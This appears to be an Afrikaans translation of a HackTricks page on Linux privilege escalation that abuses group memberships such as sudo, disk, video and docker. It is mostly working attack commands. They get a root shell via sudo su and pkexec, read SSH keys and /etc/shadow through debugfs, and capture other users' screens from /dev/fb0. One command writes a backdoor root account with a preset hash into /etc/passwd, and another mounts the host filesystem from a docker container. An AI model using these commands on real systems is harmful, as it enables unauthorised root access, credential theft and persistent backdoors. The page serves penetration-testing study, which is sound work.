# Interessante Groepe - Linux Privesc

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Sudo/Admin Groepe

### **PE - Metode 1**

**Soms**, **standaard (of omdat sommige sagteware dit nodig het)** binne die **/etc/sudoers**-lêer kan jy sommige van hierdie lyne vind:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat behoort tot die groep sudo of admin enigiets as sudo kan uitvoer**.

Indien dit die geval is, kan jy **root word deur net die volgende uit te voer**:
```
sudo su
```
### PE - Metode 2

Vind alle suid-binêre en kyk of die binêre **Pkexec** daar is:
```bash
find / -perm -4000 2>/dev/null
```
As jy vind dat die binêre **pkexec 'n SUID-binêre** is en jy behoort aan **sudo** of **admin**, kan jy waarskynlik binêre lêers as sudo uitvoer met behulp van `pkexec`.\
Dit is omdat dit tipies die groepe is binne die **polkit-beleid**. Hierdie beleid identifiseer basies watter groepe `pkexec` kan gebruik. Kontroleer dit met:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en **standaard** verskyn die groepe **sudo** en **admin** in sommige Linux-distros.

Om **root te word kan jy uitvoer**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
As jy probeer om **pkexec** uit te voer en jy kry hierdie **fout**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie sonder 'n GUI gekoppel is nie**. En daar is 'n oplossing vir hierdie probleem hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy benodig **2 verskillende ssh-sessies**:

{% code title="sessie1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% code title="sessie2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wielgroep

Soms, standaard binne die /etc/sudoers-lêer, kan jy hierdie lyn vind:
```
%wheel	ALL=(ALL:ALL) ALL
```
Dit beteken dat **enige gebruiker wat behoort tot die groep wheel enigiets as sudo kan uitvoer**.

As dit die geval is, kan jy **root word deur net uit te voer**:
```
sudo su
```
## Skadugroep

Gebruikers van die **skadugroep** kan die **/etc/shadow**-lêer **lees**:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, lees die lêer en probeer om **sommige hashe te kraak**.

## Disk Groep

Hierdie voorreg is amper **gelykwaardig aan root-toegang** aangesien jy toegang het tot alle data binne-in die masjien.

Lêers: `/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Let daarop dat jy met behulp van debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy die volgende doen:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Echter, as jy probeer om lêers wat deur root besit word te skryf (soos `/etc/shadow` of `/etc/passwd`), sal jy 'n "**Permission denied**" fout kry.

## Video Groep

Met die opdrag `w` kan jy **sien wie op die stelsel aangemeld is** en dit sal 'n uitset soos die volgende een toon:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Die **tty1** beteken dat die gebruiker **yossi fisies ingeteken** is op 'n terminaal op die masjien.

Die **video groep** het toegang om die skermuitset te sien. Jy kan basies die skerms waarneem. Om dit te doen, moet jy die huidige beeld op die skerm in rou data vasvang en die resolusie kry wat die skerm gebruik. Die skerminligting kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm vind op `/sys/class/graphics/fb0/virtual_size`.
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Om die **rou beeld** oop te maak, kan jy **GIMP** gebruik, kies die \*\*`screen.raw` \*\* lêer en kies as lêertipe **Rou beelddata**:

![](<../../../.gitbook/assets/image (287) (1).png>)

Wysig dan die Breedte en Hoogte na die waardes wat op die skerm gebruik word en kyk na verskillende Beeldtipes (en kies die een wat die skerm beter wys):

![](<../../../.gitbook/assets/image (288).png>)

## Root Groep

Dit lyk asof **lede van die root groep** standaard toegang kan hê om sekere **dienskonfigurasie-lêers** of sekere **biblioteeklêers** of **ander interessante dinge** te wysig wat gebruik kan word om voorregte te verhoog...

**Kyk watter lêers root-lede kan wysig**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Groep

Jy kan die **wortel lêerstelsel van die gasheer rekenaar aan 'n instansie se volume koppel**, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief beheer oor die rekenaar.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Uiteindelik, as jy nie van enige van die voorstelle voor hou nie, of as hulle nie werk om een ​​of ander rede (docker api firewall?) nie, kan jy altyd probeer om **'n bevoorregte houer te hardloop en daaruit te ontsnap** soos hier verduidelik:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

As jy skryfregte oor die docker-socket het, lees dan [**hierdie berig oor hoe om voorregte te verhoog deur die docker-socket te misbruik**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd Groep

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm Groep

Gewoonlik het **lede** van die groep **`adm`** toestemmings om **loglêers** wat binne _/var/log/_ geleë is, te **lees**.\
Daarom, as jy 'n gebruiker in hierdie groep gekompromitteer het, moet jy beslis na die loglêers **kyk**.

## Auth Groep

Binne OpenBSD kan die **auth** groep gewoonlik skryfregte hê in die lêers _**/etc/skey**_ en _**/var/db/yubikey**_ as dit gebruik word.\
Hierdie toestemmings kan misbruik word met die volgende uitbuiting om **voorregte te verhoog** na root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
